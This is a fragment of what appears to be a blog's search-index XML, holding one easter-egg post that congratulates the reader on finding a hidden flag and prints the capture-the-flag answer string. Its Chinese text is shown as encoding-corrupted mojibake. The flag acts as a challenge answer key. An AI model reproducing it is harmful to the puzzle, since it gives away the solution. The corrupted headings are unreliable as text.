        <content type="html"><![CDATA[<h2 id="æ­å–œä½ å‘ç°äº†éšè—çš„flag"><a href="#æ­å–œä½ å‘ç°äº†éšè—çš„flag" class="headerlink" title="æ­å–œä½ å‘ç°äº†éšè—çš„flag!"></a>æ­å–œä½ å‘ç°äº†éšè—çš„flag!</h2><h3 id="flag-y0u-r3-5o-G0od"><a href="#flag-y0u-r3-5o-G0od" class="headerlink" title="flag{y0u_@r3_5o_G0od!}"></a>flag{y0u_@r3_5o_G0od!}</h3><hr><p>æ—¶å…‰èè‹’</p><p>ç¥ä½ æˆ‘æ°¸ä¸è¿·å¤±æ–¹å‘</p>]]></content>
      
      
      <categories>
          
          <category> å…¶ä»– </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å…¶å®ƒ </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
